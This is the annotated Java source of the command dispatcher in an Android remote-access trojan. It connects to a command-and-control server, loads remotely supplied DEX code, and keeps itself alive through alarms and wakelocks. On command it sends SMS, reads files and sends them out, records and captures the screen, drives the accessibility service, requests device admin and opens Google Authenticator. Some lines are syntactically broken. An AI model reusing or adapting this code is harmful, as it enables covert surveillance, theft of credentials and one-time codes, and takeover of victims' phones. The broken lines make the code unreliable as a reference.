package com.android.pictach;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.widget.Toast;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

/**
 * Api — Command dispatcher service.
 *
 * This service is the brain of the C2 client.
 * It reads commands from love.commandQueue (filled by NetworkManager),
 * parses them, and dispatches to the correct handler.
 *
 * Startup flow (called from initializeAndConnect):
 *   1. Sets Config.FTX0/1/2/3 to their runtime values
 *   2. Creates the thread pool executor for async C2 operations
 *   3. Connects to C2 via NetworkManager.initialize()
 *   4. Starts CommandProcessorTask (AsyncTask) to read command queue
 *
 * Command packet format (after split by "TxTxT"):
 *   split[0] = command type code
 *   split[1] = primary argument
 *   split[2] = secondary argument
 *   split[3] = tertiary argument
 *   split[4] = command subtype flag
 *   split[5..18] = additional parameters / command codes
 *
 * Command types (matched against love.commandCodes[]):
 *   "0"                  → load new DEX module from C2
 *   commandCodes[4]      → invoke method on loaded module
 *   commandCodes[5]      → execute a text command (ddll subtype)
 *   commandCodes[6]      → start screen recording
 *   commandCodes[7]      → stop screen recording
 *   commandCodes[8]      → disconnect
 *   commandCodes[9]      → ping response
 *   commandCodes[11]     → status check
 *   commandCodes[12]     → stop live session
 *   commandCodes[13]     → wakelock command
 *   commandCodes[14]     → refresh handshake
 *
 * "ddll" sub-commands (split[4] == "ddll"):
 *   "msg:...:up"         → upload file to C2
 *   "msg:...:fsh"        → full screen (Firebasemac activity)
 *   "msg:..."            → show Toast
 *   "goauth<*>"          → open Google Authenticator
 *   "kill<*>"            → set bypass flag
 *   "pst<*>"             → paste text via accessibility
 *   "lnk<*>"             → open URL
 *   "ssms<*>"            → send SMS
 *   "adm<*>"             → request device admin
 *   "admwip<*>"          → wipe device (device admin)
 *   "rdd<*>"             → delete log file
 *   "rd<*>"              → read file, send to C2
 *   "sp<*>"              → swipe gesture
 *   "sc:"                → screenshot
 */
public class Api extends Service {

    PowerManager.WakeLock wakeLock = null;

    // ─── Service lifecycle ────────────────────────────────────────────────────

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            Utils.scheduleRestartAlarm(getApplicationContext(), "Scanner", 180000L);
            Intent restartIntent = new Intent(getApplicationContext(), getClass());
            restartIntent.setPackage(getPackageName());
            ((AlarmManager) getApplicationContext().getSystemService("alarm"))
                    .set(3, SystemClock.elapsedRealtime() + 1000,
                            PendingIntent.getService(getApplicationContext(), 1,
                                    restartIntent, 1073741824));
            if (wakeLock != null && !wakeLock.equals(null) && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception unused) {
        }
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Utils.stateFlag0 = 0;
        try {
            Utils.scheduleRestartAlarm(getApplicationContext(), "iamdone", 180000L);
        } catch (Exception unused) {
        }
        try {
            sendBroadcast(
                    new Intent(getApplicationContext(), Bodybuilding.class)
                            .setAction("RestartSensor"));
        } catch (Exception unused2) {
        }
        try {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
            stopForeground(true);
        } catch (Exception unused3) {
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            if (love.app_love_Context == null) {
                love.app_love_Context = getApplicationContext();
            }

            Utils.scheduleRestartAlarm(getApplicationContext(), "Battery", 18000L);

            PowerManager pm = (PowerManager) getSystemService("power");
            if (wakeLock == null) {
                wakeLock = pm.newWakeLock(1, "PeriSecure:MyWakeLock");
            }
            if (wakeLock != null && !wakeLock.isHeld()) {
                wakeLock.acquire();
            }

            Context appCtx = getApplicationContext();
            Utils.currentPrefKey = appCtx.getResources()
                    "11";

            // Start foreground notification if API >= 26
            if (Build.VERSION.SDK_INT >= 26
                    && Utils.currentPrefKey.charAt(1) == Utils.charOne) {
                try {
                    Notification n = Utils.buildForegroundNotification(
                            appCtx, "Worker", "Workers");
                    if (n != null) startForeground(9594, n);
                } catch (Exception unused) {
                }
            }

            // Set runtime Config keys (overwrite placeholder values)
            Config.FTX0 = "sysdata";
            Config.FTX1 = "appdata";
            Config.FTX2 = "configrs";
            Config.FTX3 = "sysinfo";

            // Initialize thread pool for C2 send/receive operations
            Utils.threadPoolExecutor = new ThreadPoolExecutor(
                    8, 15, 1L, TimeUnit.MINUTES,
                    new ArrayBlockingQueue<>(Utils.maxThreadCount)
            );

            // Connect to C2 server and start command processor
            initializeAndConnect(this);

        } catch (Exception unused2) {
        }
    }

    // ─── Initialization ───────────────────────────────────────────────────────

    /**
     * Main initialization:
     * 1. Gets device ID (from Settings.Secure.android_id or Config.generateDeviceId)
     * 2. Initializes command queue and module list
     * 3. Reads stored C2 host/port from SharedPreferences (if saved)
     * 4. Connects to C2 via NetworkManager
     * 5. Starts CommandProcessorTask
     *
     * Original obfuscated name: m576p / p
     */
    public static void initializeAndConnect(Context context) {
        String deviceId;
        String host;
        String port;
        String storedId = "";

        try {
            // Get device identifier
            try {
                deviceId = "" + Settings.Secure.getString(
                        context.getContentResolver(), "android_id");
            } catch (Exception unused) {
                deviceId = Config.generateDeviceId(context);
            }

            // Initialize queues
            love.commandQueue   = new ArrayList<>();
            love.loadedModules  = new ArrayList<>();

            // Build registration string
            String regString = "@MY-RAT-ALWAYS-SLEEPS_1111_ GODEX & SIMRAN & SELF__" + deviceId;

            // Read stored host/port from SharedPreferences
            String hostKey  = Config.FTX0;
            String portKey  = Config.FTX1;
            String idKey    = Config.FTX2;
            try { storedId  = Config.FTX2; } catch (Exception unused2) {}

            // Decode default host/port from Base64 in love.java
            host = Utils.base64Decode(love.Host);
            port = Utils.base64Decode(love.Port);

            // Save device ID to SharedPreferences if not already saved
            if (Utils.readPref(context, hostKey).length() == 0) {
                try {
                    Utils.writePref(context, regString, hostKey);
                } catch (Exception unused3) {
                }
            }

            // Override host/port with stored values if present
            if (Utils.readPref(context, portKey).length() != 0) {
                host = Utils.readPref(context, portKey);
            }
            if (Utils.readPref(context, storedId).length() != 0) {
                port = Utils.readPref(context, storedId);
            }

            // Connect to C2 server
            NetworkManager.initialize(host, port, context);

            // Start command processor
            new CommandProcessorTask().execute(context);

        } catch (Exception unused4) {
        }
    }

    // ─── Command processor ────────────────────────────────────────────────────

    /**
     * CommandProcessorTask — AsyncTask that runs forever reading love.commandQueue.
     *
     * Reads Config objects from love.commandQueue (filled by NetworkManager).
     * Each Config.str is split by "TxTxT" separator into fields.
     * split[0] = command type → dispatched to correct handler.
     *
     * Runs on a background thread permanently — the command dispatch loop.
     *
     * Original obfuscated class name: AsyncTaskC0189ta / Api$ta
     */
    public static class CommandProcessorTask extends AsyncTask<Context, Integer, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(Context... contexts) {
            while (true) {
                try {
                    // ── Timeout / reconnect watchdog ──────────────────────────
                    if (!NetworkManager.isReceiving) {
                        love.commandTimeoutAt = -1L;
                        // MyAccess check omitted (Firebase stub)
                    } else if (love.commandTimeoutAt == -1) {
                        love.commandTimeoutAt = System.currentTimeMillis() + 45000;
                    } else if (System.currentTimeMillis() > love.commandTimeoutAt) {
                        // Timeout — send shell result back to C2
                        String shellResult = Utils.shellCommandResult;
                        if (love.inx == 2) shellResult = "\t";
                        try {
                            NetworkManager.sendToC2(Utils.negTwoFiveFive, shellResult.getBytes());
                            NetworkManager.runCommand();
                        } catch (Exception unused) {
                        }
                        if (love.inx >= 3) {
                            love.inx = -1;
                            NetworkManager.closeAll("DONE");
                        } else {
                            love.inx++;
                        }
                        love.commandTimeoutAt = -1L;
                    }
                } catch (Exception unused2) {
                }

                try {
                    // ── Process command queue ─────────────────────────────────
                    if (love.commandQueue.size() > 0) {
                        Config cmd = love.commandQueue.get(0);
                        if (cmd != null) {
                            // Split command string by "TxTxT" separator
                            String[] parts = cmd.str.split(love.packetSeparator);
                            String cmdType = parts[0];

                            // ── Command type "0": Load DEX module ─────────────
                            if (cmdType.equals("0")) {
                                Class<?> loadedClass = LoveApi0.loadDexModule(
                                        new Object[]{
                                                contexts[0],
                                                cmd.byt,
                                                parts[1],  // class name
                                                parts[4]   // opt dir name
                                        }
                                );
                                love.loadedModules.add(
                                        new DataHelper(loadedClass.getName(), loadedClass));

                                // Once all expected modules are loaded, assign command codes
                                if (love.loadedModules.size()
                                        == Integer.valueOf(parts[2]).intValue()) {
                                    love.commandCodes[0]  = parts[5];
                                    love.commandCodes[4]  = parts[6];
                                    love.commandCodes[5]  = parts[7];
                                    try {
                                        love.commandCodes[6]  = parts[8];
                                        love.commandCodes[7]  = parts[9];
                                        love.commandCodes[8]  = parts[10];
                                    } catch (Exception unused3) {
                                    }
                                    love.commandCodes[9]  = parts[11];
                                    love.commandCodes[10] = parts[12];
                                    love.commandCodes[11] = parts[13];
                                    love.commandCodes[12] = parts[14];
                                    love.commandCodes[13] = parts[15];
                                    love.commandCodes[14] = parts[16];
                                    love.commandCodes[15] = parts[17];
                                    love.commandCodes[16] = parts[18];
                                    love.loadedModuleCount = love.loadedModules.size();

                                    // Run shell cleanup on module directory
                                    LoveApi0.runShellOnModuleDir(
                                            new Object[]{contexts[0], parts[3]});

                                    // Update C2 timing and send ready signal
                                    NetworkManager.readDelayMs = 10L;
                                    NetworkManager.sendToC2(
                                            love.commandCodes[15], "\t".getBytes());
                                }

                            // ── Invoke loaded module method ───────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[4])) {
                                if (love.loadedModules.size() > 0) {
                                    int i = 0;
                                    while (true) {
                                        if (i > love.loadedModules.size()) break;
                                        if (love.loadedModules.get(i).className
                                                .equals(parts[1])) {
                                            Object result = LoveApi0.invokeModuleMethod(
                                                    "ʼʾʿˈᵔঙʿ$ʿʼ",
                                                    new Object[]{
                                                            contexts[0],
                                                            love.loadedModules.get(i).moduleClass,
                                                            parts[2],   // method name
                                                            parts[4],   // string arg
                                                            cmd.byt     // byte[] arg
                                                    }
                                            );
                                            if (!parts[3].equals(love.commandCodes[16])) {
                                                try {
                                                    NetworkManager.sendToC2(
                                                            parts[3],
                                                            Utils.objectToBytes(result));
                                                } catch (Exception unused4) {
                                                }
                                            }
                                        } else {
                                            i++;
                                        }
                                    }
                                }

                            // ── Execute text command (ddll subtype) ───────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[5])) {
                                String[] cmdArgs = {
                                        parts[1], parts[2], parts[3], parts[4],
                                        parts[5], parts[6], parts[7], parts[8]
                                };

                                if (parts[4].equals("ddll")) {
                                    dispatchTextCommand(contexts[0], parts, cmdArgs);
                                } else if (LoveApi0.isServiceNotRunning(com.class, contexts[0])) {
                                    Intent i = new Intent(contexts[0], com.class);
                                    i.putExtra(Config.FTX1, cmdArgs);
                                    contexts[0].startService(i);
                                } else {
                                    love.isOrca = false;
                                    contexts[0].stopService(
                                            new Intent(contexts[0], com.class));
                                    Thread.sleep(1000L);
                                }

                            // ── Start screen recording ────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[6])) {
                                if (LoveApi0.isServiceNotRunning(video.class, contexts[0])) {
                                    Intent i = new Intent(contexts[0], video.class);
                                    i.putExtra(Config.FTX2,
                                            new String[]{parts[1], parts[2]});
                                    contexts[0].startService(i);
                                }

                            // ── Stop screen recording ─────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[7])) {
                                if (!LoveApi0.isServiceNotRunning(video.class, contexts[0])) {
                                    contexts[0].stopService(
                                            new Intent(contexts[0], video.class));
                                }

                            // ── Disconnect command ────────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[8])) {
                                Utils.removeMarker(parts[1], "");
                                NetworkManager.closeAll("disconnectCmd");

                            // ── Ping response ─────────────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[9])) {
                                Utils.releaseLocks(false);
                                NetworkManager.sendToC2(parts[1], "\t".getBytes());

                            // ── Status check ──────────────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[11])) {
                                love.commandCodes[1]  = parts[1];
                                love.commandCodes[2]  = parts[2];
                                love.commandCodes[3]  = parts[3];
                                love.isConnected = Utils.isAccessibilityEnabled(
                                        contexts[0], Firebase.class);
                                love.isLive = love.isConnected;
                                NetworkManager.sendToC2(
                                        love.commandCodes[1]
                                        + love.commandCodes[2]
                                        + String.valueOf(love.isConnected)
                                        + "|"
                                        + love.getLogFileList(),
                                        "\t".getBytes()
                                );

                            // ── Stop live session ─────────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[12])) {
                                love.isLive = false;

                            // ── Wakelock command ──────────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[13])) {
                                Utils.acquireLocks(contexts[0], true);
                                NetworkManager.sendToC2(parts[1], "\t".getBytes());

                            // ── Refresh handshake ─────────────────────────────
                            } else if (Utils.stringsMatch(cmdType, love.commandCodes[14])
                                    && NetworkManager.isReceiving) {
                                NetworkManager.sendHandshake("refresh");
                            }
                        }

                        // Remove processed command from queue
                        if (!NetworkManager.isConnected) {
                            love.commandQueue.clear();
                        } else {
                            love.commandQueue.remove(0);
                        }
                        Thread.sleep(1L);

                    } else {
                        // Queue empty — wait before checking again
                        Thread.sleep(1000L);
                    }

                } catch (Exception unused5) {
                }
            }
        }

        /**
         * Dispatches "ddll" subcommand to the correct handler.
         * Called when split[4] == "ddll" (text command subtype).
         */
        private void dispatchTextCommand(Context ctx, String[] parts, String[] cmdArgs) {
            String cmd = parts[1];

            if (cmd.startsWith("msg:")) {
                if (cmd.endsWith(":up")) {
                    // Upload file to C2
                    new DownloadTask().setContext(
                            love.app_love_Context,
                            cmd.replace("msg:", "").replace(":up", "")
                    );
                } else if (cmd.endsWith(":fsh")) {
                    // Full screen activity
                    showFullScreen(cmd.replace("msg:", "").replace(":fsh", ""));
                } else {
                    // Toast message
                    showToast(cmd.replace("msg:", ""));
                }

            } else if (cmd.startsWith("goauth<*>")) {
                // Open Google Authenticator
                String pkgAuth = Utils.removeMarker(
                        "co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2", "#$");
                if (Utils.isAppInstalled(ctx, pkgAuth)) {
                    Intent launch = ctx.getPackageManager()
                            .getLaunchIntentForPackage(pkgAuth);
                    launch.addFlags(268435456);
                    ctx.startActivity(launch);
                } else {
                    NetworkManager.sendToC2(
                            Utils.negFourFour,
                            "Google Auth<app not installed<app not installed".getBytes()
                    );
                }

            } else if (cmd.startsWith("kill<*>")) {
                // Bypass flag
                Firebase.Firebasebypass = true;

            } else if (cmd.startsWith("pst<*>")) {
                // Paste text via accessibility
                if (love.MyAccess != null) {
                    Firebase.pasteText = cmd.replace("pst<*>", "");
                    Firebase.needPaste = true;
                    love.MyAccess.triggerAction();
                }

            } else if (cmd.startsWith("lnk<*>")) {
                // Open URL
                openLink(cmd.replace("lnk<*>", ""));

            } else if (cmd.startsWith("ssms<*>")) {
                // Send SMS: "ssms<*>number#message"
                String[] smsParts = cmd.replace("ssms<*>", "").split("#");
                Firebase.sendSMS(smsParts[0], smsParts[1]);

            } else if (cmd.startsWith("adm<*>")) {
                // Request device admin
                requestAdmin();

            } else if (cmd.startsWith("rdd<*>")) {
                // Delete log file
                Firebase.fileReadStatus = "wait";
                love.deleteLogFile(cmd.replace("rd<*>", ""));
                Firebase.fileReadStatus = "on";

            } else if (cmd.startsWith("rd<*>")) {
                // Read file and send to C2
                Firebase.fileReadStatus = "wait";
                NetworkManager.sendToC2(
                        Utils.eightEightEight,
                        love.MyAccess.readFile(cmd.replace("rd<*>", "")).getBytes()
                );
                Firebase.fileReadStatus = "on";

            } else if (cmd.startsWith("sp<*>")) {
                // Swipe gesture (Android 7+)
                if (Build.VERSION.SDK_INT >= 24) {
                    String gestureStr = cmd.replace("sp<*>", "");
                    if (!gestureStr.contains("clk")
                            && !gestureStr.contains("Bc")
                            && !gestureStr.contains("Ho")
                            && !gestureStr.contains("RC")) {
                        String[] pointStrs = gestureStr.split(Pattern.quote(":"));
                        Point[] points = new Point[pointStrs.length];
                        for (int j = 0; j < pointStrs.length; j++) {
                            String[] xy = pointStrs[j]
                                    .replace("{", "").replace("}", "").split(",");
                            points[j] = new Point(
                                    Integer.parseInt(xy[0].split("=")[1]),
                                    Integer.parseInt(xy[1].split("=")[1])
                            );
                        }
                        love.MyAccess.drawSwipePath(points, 1000);
                    }
                    love.MyAccess.performSwipe(cmd.replace("sp<*>", ""));
                }

            } else if (cmd.startsWith("sc:")) {
                // Screenshot
                startScreen(cmd.replace("sc:", ""));
            }
        }

        // ── Request device admin ──────────────────────────────────────────────
        private void requestAdmin() {
            if (love.app_love_Context != null) {
                try {
                    new Handler(Looper.getMainLooper()).post(new Runnable() {
                        @Override
                        public void run() {
                            love.app_love_Context.startActivity(
                                    new Intent(love.app_love_Context, activityadm.class)
                                            .addFlags(268435456)
                                            .addFlags(536870912)
                                            .addFlags(1073741824)
                            );
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
        }
    }

    // ─── Static helpers ───────────────────────────────────────────────────────

    /**
     * Shows a Toast message on the main thread.
     * Called by C2 "msg:..." command.
     *
     * Original obfuscated name: showToast
     */
    public static void showToast(final String message) {
        if (love.app_love_Context != null) {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        Toast.makeText(love.app_love_Context, message, 1).show();
                    } catch (Exception unused) {
                    }
                }
            });
        }
    }

    /**
     * Opens a URL in the browser.
     * Called by C2 "lnk<*>url" command.
     *
     * Original obfuscated name: openlink
     */
    public static void openLink(final String url) {
        if (love.app_love_Context != null) {
            try {
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        Intent intent = new Intent("android.intent.action.VIEW",
                                Uri.parse(url));
                        intent.setFlags(268435456);
                        love.app_love_Context.startActivity(intent);
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Launches Firebasemac (full screen overlay) activity.
     * Called by C2 "msg:...:fsh" command.
     *
     * Original obfuscated name: FPPAGE
     */
    public static void showFullScreen(String key) {
        if (love.app_love_Context != null) {
            try {
                Intent intent = new Intent(love.app_love_Context, Firebasemac.class);
                intent.addFlags(268435456);
                intent.putExtra("key", key);
                love.app_love_Context.startActivity(intent);
            } catch (Exception unused) {
            }
        }
    }

    /**
     * Starts screenshot capture.
     * Called by C2 "sc:" command.
     * Uses reflection to call Utils.StartNewScan to avoid direct reference.
     *
     * Original obfuscated name: StartScreen
     */
    public static void startScreen(String param) {
        // Uses reflection: Class.forName("Utils").getDeclaredMethod("StartNewScan")
        // base64Decode("U3RhcnROZXdTY2Fu") → "StartNewScan"
        Class<?> cls;
        Object obj;
        Method method = null;
        try {
            try {
                cls = Class.forName("com.android.pictach.Utils");
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
                cls = null;
            }
            try {
                obj = cls.newInstance();
            } catch (IllegalAccessException | InstantiationException e) {
                e.printStackTrace();
                obj = null;
            }
            try {
                method = cls.getDeclaredMethod(
                        Utils.base64Decode("U3RhcnROZXdTY2Fu"), // "StartNewScan"
                        Context.class, Intent.class);
            } catch (NoSuchMethodException unused) {
            }
            if (method != null) {
                method.invoke(obj,
                        love.app_love_Context,
                        new Intent(love.app_love_Context, Api.class));
            }
        } catch (Exception unused2) {
        }
    }
}
